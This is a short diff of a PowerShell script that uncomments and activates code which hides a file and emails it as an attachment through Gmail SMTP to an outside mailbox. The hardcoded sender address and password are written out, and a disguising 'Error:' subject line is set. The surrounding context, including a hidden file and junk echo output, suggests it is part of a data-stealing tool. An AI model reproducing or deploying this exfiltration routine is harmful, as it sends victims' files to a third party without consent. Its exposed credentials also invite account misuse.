@@ -112,14 +112,17 @@ echo "dadasdasdasdasasd"
 
 attrib +H $p
 
-# $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
-# $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
+$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
+$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
 
-# $ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Error: "+$e
-# $s=New-Object Net.Mail.Attachment($p);
-# if("WinRAR"-in $arh)
-#   {$ReportEmail.Attachments.Add($s)}
-# else
-#   {$ReportEmail.Attachments.Add($s)};
-# $SMTPInfo.Send($ReportEmail)
+$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Error: "+$e
+$s=New-Object Net.Mail.Attachment($p);
+if("WinRAR"-in $arh)
+  {$ReportEmail.Attachments.Add($s)}
+else
+  {$ReportEmail.Attachments.Add($s)};
+
+$mes = New-Object System.Net.Mail.MailMessage
+$mes.Body = "<h1>Тестовое письмо</h1>"
+$SMTPInfo.Send($ReportEmail)
 
